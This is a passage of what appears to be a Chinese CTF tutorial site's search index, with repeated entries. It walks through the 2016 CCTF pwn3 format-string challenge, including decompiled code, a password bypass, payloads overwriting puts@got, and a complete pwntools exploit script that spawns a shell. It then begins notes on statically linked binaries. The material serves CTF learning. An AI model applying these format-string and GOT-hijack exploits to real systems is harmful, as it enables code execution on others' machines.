[esp+10Ch] [ebp-Ch] printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 40); return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } } return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 }","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"fmtstr/example/fmtstr_example/2016_CCTF_pwn3_writeup/#_4","text":"\u6574\u4f53\u653b\u51fb\u5de5\u7a0b\uff1a \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002","title":"\u601d\u8def"},{"location":"fmtstr/example/fmtstr_example/2016_CCTF_pwn3_writeup/#_5","text":"\u7b80\u5355\u79fb\u4f4d\u5bc6\u7801\uff0c\u79fb\u52a8\u4f4d\u6570\u662f 1 \u3002\u5bc6\u6587\u662f\uff1a sysbdmin \uff0c\u5bf9\u5e94\u660e\u6587\u662f\uff1a rxraclhm \u3002 __isoc99_scanf(\"%40s\", src); for ( i = 0; i <= 39 && src[i]; ++i ) ++src[i];","title":"\u7ed5\u8fc7\u5bc6\u7801"},{"location":"fmtstr/example/fmtstr_example/2016_CCTF_pwn3_writeup/#_6","text":"\u6211\u8fd8\u662f\u4f7f\u7528\u81ea\u5df1\u719f\u6089\u7684\u65b9\u6cd5\u6cc4\u9732\u51fa\u5730\u5740\uff08\u5199\u4e00\u5806%p\uff09\uff0c\u61d2\u5f97\u8ba1\u7b97\uff0c\u504f\u79fb\u4e3a 7 \uff1a","title":"\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb"},{"location":"fmtstr/example/fmtstr_example/2016_CCTF_pwn3_writeup/#libc","text":"content \u662f\u5b58\u5728\u5806\u4e2d\u7684\uff0c\u4e0d\u662f\u6808\u4e0a\u7684\uff0c\u4e5f\u5c31\u641e\u4e0d\u5230\u6808\u4e0a\u7684 libc \u51fd\u6570\u5730\u5740\uff0c\u4f46\u662f\u5806\u4e2d\u5185\u5bb9\u662f\u53ef\u63a7\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f80\u91cc\u9762\u5199\u5165 libc \u51fd\u6570\u5730\u5740\uff0c\u7136\u540e\u5728\u8bfb\u51fa\u6765\u5c31\u884c\u4e86\u3002 payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4))","title":"\u6cc4\u9732 libc \u5730\u5740"},{"location":"fmtstr/example/fmtstr_example/2016_CCTF_pwn3_writeup/#got","text":"\u4fee\u6539\u8fd8\u662f\u7528\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \uff0c\u9700\u8981\u505a\u7684\u5c31\u662f\u5c06 payload \u5199\u5165\u5230\u5806\u4e2d\uff0c\u7136\u540e\u7528\u7a0b\u5e8f\u7684 get \u529f\u80fd\u89e6\u53d1\u6f0f\u6d1e\u3002payload \u7684\u8bdd\u53ef\u4ee5\u7528 pwntools \u5de5\u5177\u6784\u5efa\uff0c32 \u4f4d\u7684\u95ee\u9898\u4e0d\u5927\uff0c64 \u4f4d\u7684\u8bdd\u6211\u9009\u62e9\u624b\u52a8\u3002 \u8986\u76d6\u65b9\u5f0f\u591a\u79cd\u591a\u6837\u4e86\uff0c\u4e0b\u9762\u7684\u662f\u6700\u540e\u5b9e\u73b0\u8c03\u7528 system('/bin/sh') \uff1a payload = fmtstr_payload(7, {puts_got: system}) creat('/bin/sh;', payload) # write 2 chunk show('/bin/sh;') # overwrite puts@got 2 system@got showlist() # getshell \u8fd9\u4e2a\u5806\u540d\u8981\u662f /binsh; \uff0c/bin/sh \u7684\u8bdd\u662f showlist \u65f6\u4f5c\u4e3a system \u53c2\u6570\u3002 ; \u662f\u7528\u6765\u5206\u5272\u524d\u9762\u6211\u4eec\u7528\u6765\u6cc4\u9732\u5730\u5740\u7684\u5806\u540d\uff0c\u5982\u679c\u4e0d\u52a0\u6700\u540e\u6784\u9020\u51fa\u6765\u662f\uff1a system('/bin/shaaaa') \u53e6\u5916\u4e00\u79cd\u586b\u5145\u65b9\u5f0f\u5c31\u662f\uff1a\u5c06 puts@got \u586b\u5145\u4e3a onegadget \uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u5bf9\u5806\u540d\u6709\u8981\u6c42\u4e86\u3002 payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb')","title":"\u4fee\u6539 got \u8868"},{"location":"fmtstr/example/fmtstr_example/2016_CCTF_pwn3_writeup/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn3.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive()","title":"exp"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/","text":"2016 CCTF pwn3 \u8003\u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001hijack GOT\u3001\u5806 \u5206\u6790 \u4fdd\u62a4\u60c5\u51b5 32 \u4f4d\u52a8\u6001\u94fe\u63a5\uff1b\u6253\u5f00 NX \uff1bRELRO \u90e8\u5206\u4fdd\u62a4\uff0c\u53ef\u4ee5\u6539 GOT \u8868\u5730\u5740 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u6f0f\u6d1e\u51fd\u6570 \u7a0b\u5e8f\u5b9e\u73b0\u7684\u8f93\u51fa\u529f\u80fd\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u51fd\u6570\u5c06\u5185\u5bb9\u5199\u5165\u5230 dest \u4e2d\uff0c\u5728\u7528 printf \u8f93\u51fa\uff0c\u800c dest \u5185\u5bb9\u662f\u53ef\u63a7\u7684\u3002 int get_file() { char dest; // [esp+1Ch] [ebp-FCh] char s1; // [esp+E4h] [ebp-34h] char *i; // [esp+10Ch] [ebp-Ch] printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 40); return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } } return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } \u601d\u8def \u6574\u4f53\u653b\u51fb\u5de5\u7a0b\uff1a \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u7ed5\u8fc7\u5bc6\u7801 \u7b80\u5355\u79fb\u4f4d\u5bc6\u7801\uff0c\u79fb\u52a8\u4f4d\u6570\u662f 1 \u3002\u5bc6\u6587\u662f\uff1a sysbdmin \uff0c\u5bf9\u5e94\u660e\u6587\u662f\uff1a rxraclhm \u3002 __isoc99_scanf(\"%40s\", src); for ( i = 0; i <= 39 && src[i]; ++i ) ++src[i]; \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u6211\u8fd8\u662f\u4f7f\u7528\u81ea\u5df1\u719f\u6089\u7684\u65b9\u6cd5\u6cc4\u9732\u51fa\u5730\u5740\uff08\u5199\u4e00\u5806%p\uff09\uff0c\u61d2\u5f97\u8ba1\u7b97\uff0c\u504f\u79fb\u4e3a 7 \uff1a \u6cc4\u9732 libc \u5730\u5740 content \u662f\u5b58\u5728\u5806\u4e2d\u7684\uff0c\u4e0d\u662f\u6808\u4e0a\u7684\uff0c\u4e5f\u5c31\u641e\u4e0d\u5230\u6808\u4e0a\u7684 libc \u51fd\u6570\u5730\u5740\uff0c\u4f46\u662f\u5806\u4e2d\u5185\u5bb9\u662f\u53ef\u63a7\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f80\u91cc\u9762\u5199\u5165 libc \u51fd\u6570\u5730\u5740\uff0c\u7136\u540e\u5728\u8bfb\u51fa\u6765\u5c31\u884c\u4e86\u3002 payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) \u4fee\u6539 got \u8868 \u4fee\u6539\u8fd8\u662f\u7528\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \uff0c\u9700\u8981\u505a\u7684\u5c31\u662f\u5c06 payload \u5199\u5165\u5230\u5806\u4e2d\uff0c\u7136\u540e\u7528\u7a0b\u5e8f\u7684 get \u529f\u80fd\u89e6\u53d1\u6f0f\u6d1e\u3002payload \u7684\u8bdd\u53ef\u4ee5\u7528 pwntools \u5de5\u5177\u6784\u5efa\uff0c32 \u4f4d\u7684\u95ee\u9898\u4e0d\u5927\uff0c64 \u4f4d\u7684\u8bdd\u6211\u9009\u62e9\u624b\u52a8\u3002 \u8986\u76d6\u65b9\u5f0f\u591a\u79cd\u591a\u6837\u4e86\uff0c\u4e0b\u9762\u7684\u662f\u6700\u540e\u5b9e\u73b0\u8c03\u7528 system('/bin/sh') \uff1a payload = fmtstr_payload(7, {puts_got: system}) creat('/bin/sh;', payload) # write 2 chunk show('/bin/sh;') # overwrite puts@got 2 system@got showlist() # getshell \u8fd9\u4e2a\u5806\u540d\u8981\u662f /binsh; \uff0c/bin/sh \u7684\u8bdd\u662f showlist \u65f6\u4f5c\u4e3a system \u53c2\u6570\u3002 ; \u662f\u7528\u6765\u5206\u5272\u524d\u9762\u6211\u4eec\u7528\u6765\u6cc4\u9732\u5730\u5740\u7684\u5806\u540d\uff0c\u5982\u679c\u4e0d\u52a0\u6700\u540e\u6784\u9020\u51fa\u6765\u662f\uff1a system('/bin/shaaaa') \u53e6\u5916\u4e00\u79cd\u586b\u5145\u65b9\u5f0f\u5c31\u662f\uff1a\u5c06 puts@got \u586b\u5145\u4e3a onegadget \uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u5bf9\u5806\u540d\u6709\u8981\u6c42\u4e86\u3002 payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') exp #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn3.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive()","title":"2016 CCTF pwn3 writeup"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#2016-cctf-pwn3","text":"\u8003\u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001hijack GOT\u3001\u5806","title":"2016 CCTF pwn3"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_1","text":"","title":"\u5206\u6790"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_2","text":"32 \u4f4d\u52a8\u6001\u94fe\u63a5\uff1b\u6253\u5f00 NX \uff1bRELRO \u90e8\u5206\u4fdd\u62a4\uff0c\u53ef\u4ee5\u6539 GOT \u8868\u5730\u5740 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_3","text":"\u7a0b\u5e8f\u5b9e\u73b0\u7684\u8f93\u51fa\u529f\u80fd\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u51fd\u6570\u5c06\u5185\u5bb9\u5199\u5165\u5230 dest \u4e2d\uff0c\u5728\u7528 printf \u8f93\u51fa\uff0c\u800c dest \u5185\u5bb9\u662f\u53ef\u63a7\u7684\u3002 int get_file() { char dest; // [esp+1Ch] [ebp-FCh] char s1; // [esp+E4h] [ebp-34h] char *i; // [esp+10Ch] [ebp-Ch] printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 40); return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } } return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 }","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_4","text":"\u6574\u4f53\u653b\u51fb\u5de5\u7a0b\uff1a \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002","title":"\u601d\u8def"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_5","text":"\u7b80\u5355\u79fb\u4f4d\u5bc6\u7801\uff0c\u79fb\u52a8\u4f4d\u6570\u662f 1 \u3002\u5bc6\u6587\u662f\uff1a sysbdmin \uff0c\u5bf9\u5e94\u660e\u6587\u662f\uff1a rxraclhm \u3002 __isoc99_scanf(\"%40s\", src); for ( i = 0; i <= 39 && src[i]; ++i ) ++src[i];","title":"\u7ed5\u8fc7\u5bc6\u7801"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_6","text":"\u6211\u8fd8\u662f\u4f7f\u7528\u81ea\u5df1\u719f\u6089\u7684\u65b9\u6cd5\u6cc4\u9732\u51fa\u5730\u5740\uff08\u5199\u4e00\u5806%p\uff09\uff0c\u61d2\u5f97\u8ba1\u7b97\uff0c\u504f\u79fb\u4e3a 7 \uff1a","title":"\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#libc","text":"content \u662f\u5b58\u5728\u5806\u4e2d\u7684\uff0c\u4e0d\u662f\u6808\u4e0a\u7684\uff0c\u4e5f\u5c31\u641e\u4e0d\u5230\u6808\u4e0a\u7684 libc \u51fd\u6570\u5730\u5740\uff0c\u4f46\u662f\u5806\u4e2d\u5185\u5bb9\u662f\u53ef\u63a7\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f80\u91cc\u9762\u5199\u5165 libc \u51fd\u6570\u5730\u5740\uff0c\u7136\u540e\u5728\u8bfb\u51fa\u6765\u5c31\u884c\u4e86\u3002 payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4))","title":"\u6cc4\u9732 libc \u5730\u5740"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#got","text":"\u4fee\u6539\u8fd8\u662f\u7528\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \uff0c\u9700\u8981\u505a\u7684\u5c31\u662f\u5c06 payload \u5199\u5165\u5230\u5806\u4e2d\uff0c\u7136\u540e\u7528\u7a0b\u5e8f\u7684 get \u529f\u80fd\u89e6\u53d1\u6f0f\u6d1e\u3002payload \u7684\u8bdd\u53ef\u4ee5\u7528 pwntools \u5de5\u5177\u6784\u5efa\uff0c32 \u4f4d\u7684\u95ee\u9898\u4e0d\u5927\uff0c64 \u4f4d\u7684\u8bdd\u6211\u9009\u62e9\u624b\u52a8\u3002 \u8986\u76d6\u65b9\u5f0f\u591a\u79cd\u591a\u6837\u4e86\uff0c\u4e0b\u9762\u7684\u662f\u6700\u540e\u5b9e\u73b0\u8c03\u7528 system('/bin/sh') \uff1a payload = fmtstr_payload(7, {puts_got: system}) creat('/bin/sh;', payload) # write 2 chunk show('/bin/sh;') # overwrite puts@got 2 system@got showlist() # getshell \u8fd9\u4e2a\u5806\u540d\u8981\u662f /binsh; \uff0c/bin/sh \u7684\u8bdd\u662f showlist \u65f6\u4f5c\u4e3a system \u53c2\u6570\u3002 ; \u662f\u7528\u6765\u5206\u5272\u524d\u9762\u6211\u4eec\u7528\u6765\u6cc4\u9732\u5730\u5740\u7684\u5806\u540d\uff0c\u5982\u679c\u4e0d\u52a0\u6700\u540e\u6784\u9020\u51fa\u6765\u662f\uff1a system('/bin/shaaaa') \u53e6\u5916\u4e00\u79cd\u586b\u5145\u65b9\u5f0f\u5c31\u662f\uff1a\u5c06 puts@got \u586b\u5145\u4e3a onegadget \uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u5bf9\u5806\u540d\u6709\u8981\u6c42\u4e86\u3002 payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb')","title":"\u4fee\u6539 got \u8868"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn3.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive()","title":"exp"},{"location":"linker/statically_linked/","text":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u5f88\u5c11\u51fa\u73b0\uff0c\u4f46\u662f\u4e5f\u6709\u4e00\u4e9b\u3002\u8fd9\u7c7b elf \u7684\u6f0f\u6d1e\u5229\u7528\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u9760\u7a0b\u5e8f\u672c\u8eab\u548c\u7528\u6237\u8f93\u5165\u3002 \u7a0b\u5e8f\u672c\u8eab\u7684\u5229\u7528\u5c31\u662f\u9884\u7559\u7684\u540e\u95e8\u51fd\u6570\uff08system\uff09\u548c\u5b57\u7b26\u4e32\uff08/bin/sh\uff09\u3002\u5982\u679c\u6709\u8fd9\u4e9b\u9884\u7559\uff0c\u9898\u76ee\u96be\u5ea6\u5e94\u8be5\u4e0d\u5927\uff0c\u53ea\u8981\u8bbe\u6cd5\u63a7\u5236\u7a0b\u5e8f\u6d41\u5230\u540e\u95e8\u4e0a\u3002 \u5982\u679c\u6ca1\u6709\u9884\u7559\u7684\u540e\u95e8\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u9700\u8981\u4f9d\u9760\u7528\u6237\u8f93\u5165\u5185\u5bb9\u7ed3\u5408\u7a0b\u5e8f\u672c\u8eab gadget \u53bb\u6784\u9020\u8c03\u7528\uff0c\u4e5f\u5c31\u662f\u624b\u5de5\u6784\u9020 onegadget \u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u53bb libc \u91cc\u9762\u627e\u5229\u7528\u7684\u51fd\u6570\u548c\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982\uff1asystem\u3002\u4f46 \u9759\u6001\u94fe\u63a5\u4e0d\u4f1a\u5230 libc \u627e\u51fd\u6570\uff0c\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u8fd0\u884c\u65f6\u8981\u7528\u5230\u7684\u5168\u90e8\u4e1c\u897f\u90fd\u5df2\u7ecf\u5305\u542b\u5728 ELF \u6587\u4ef6\u91cc\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u80fd\u5229\u7528\u7684\u53ea\u6709 ELF \u6587\u4ef6\u7684\u4e1c\u897f\u3002ret2libc \u7b49\u7b49\u653b\u51fb\u65b9\u6cd5\u5c31\u4e0e\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u65e0\u7f18\u3002 \u5b9e\u9a8c\u4e00\uff1aget_started_3dsctf_2016 \u8fd9\u662f\u4e00\u6761 32 \u4f4d\u9759\u6001\u94fe\u63a5\u7684\u6808\u6ea2\u51fa\u9898\u76ee\uff0c\u9898\u76ee\u5728 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\u3002\u672c\u5730\u548c\u8fdc\u7a0b\u662f\u91c7\u7528\u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\u3002 \u672c\u5730\u5c31\u662f\u53ef\u4ee5\u5229\u7528\u9884\u7559\u7684\u540e\u95e8\u89e3\u51b3\uff0c\u8fdc\u7a0b\u5229\u7528\u9700\u8981\u7ed3\u5408 ELF \u91cc\u7684\u4e00\u4e2a\u51fd\u6570\u2014\u2014mprotect \u548c \u7528\u6237\u8f93\u5165\u5185\u5bb9\u3002 \u5206\u6790 \u4fdd\u62a4\u60c5\u51b5 32 \u4f4d\u53ea\u5f00\u542f\u4e86 NX Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u7f16\u8bd1\u60c5\u51b5 \u8fd9\u662f\u4e00\u6761\u9759\u6001\u94fe\u63a5\u7684\u9898\uff0c\u4e5f\u5c31\u662f\u7528\u4e0d\u5230 libc \u3002 $ file get_started_3dsctf_2016 get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped \u6f0f\u6d1e\u51fd\u6570 main \u51fd\u6570\u91cc\u9762\u8c03\u7528\u4e86 gets \u8fdb\u884c\u8bfb\u53d6\uff0c\u6ca1\u6709\u5bf9\u957f\u5ea6\u9650\u5236\uff0c\u53ef\u9020\u6210\u6808\u6ea2\u51fa\uff1a int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+4h] [ebp-38h] printf(\"Qual a palavrinha magica? \", v4); gets(&v4); return 0; } \u9898\u76ee\u9884\u7559\u4e86\u540e\u95e8\u51fd\u6570 get_flag \uff0c\u6709\u4e24\u4e2a\u5224\u65ad\u4f20\u53c2\u7684\u65f6\u5019\u4f20\u8fdb\u53bb\u5c31\u884c\u4e86\uff1a void __cdecl get_flag(int a1, int a2) { int v2; // eax int v3; // esi unsigned __int8 v4; // al int v5; // ecx unsigned __int8 v6; // al if ( a1 == 0x308CD64F && a2 == 0x195719D1 ) { v2 = fopen(\"flag.txt\", \"rt\"); v3 = v2; v4 = getc(v2); if ( v4 != 0xFF ) { v5 = (char)v4; do { putchar(v5); v6 = getc(v3); v5 = (char)v6; } while ( v6 != 255 ); } fclose(v3); } } \u5230\u8fd9\u91cc\u7684\u57fa\u672c\u601d\u8def\u662f\uff1a\u6808\u6ea2\u51fa\u63a7\u5236 eip \u8df3\u8f6c\u540e\u95e8\uff0c\u4e5f\u5c31\u5f97\u5230\u4e86 \u4ec5\u6808\u6ea2\u51fa\u7684 exp \uff0c\u8fdc\u7a0b\u65e0\u6cd5 getshell \u3002 \u601d\u8def \u524d\u9762\u5206\u6790\u8bf4\u4e86\u561b\uff0c\u65e0\u6cd5\u901a\u8fc7\u6808\u6ea2\u51fa\u8df3\u8f6c\u540e\u95e8\u3002\u8f6c\u6362\u4e00\u4e0b\u601d\u8def\uff0c\u6ea2\u51fa\u7a7a\u95f4\u4e0d\u9650\u3002\u5c06 shellcode \u5199\u5230\u975e\u6808\u4e0a\u7684\u5730\u65b9\uff0c\u7136\u540e\u7528 mprotect \u7ed9\u5185\u5b58\u6bb5\u52a0\u4e0a\u4e00\u4e2a\u6267\u884c\u6743\u9650\uff0c\u5728\u63a7\u5236\u7a0b\u5e8f\u6d41\u8df3\u8f6c\u5230\u4e0a\u9762\u3002 mprotect \u53c2\u6570\u5982\u4e0b\uff1a int mprotect(void *addr, size_t len, int prot); addr \u5185\u5b58\u542f\u59cb\u5730\u5740 len \u4fee\u6539\u5185\u5b58\u7684\u957f\u5ea6 prot \u5185\u5b58\u7684\u6743\u9650 prot \u7684\u503c\u4e3a 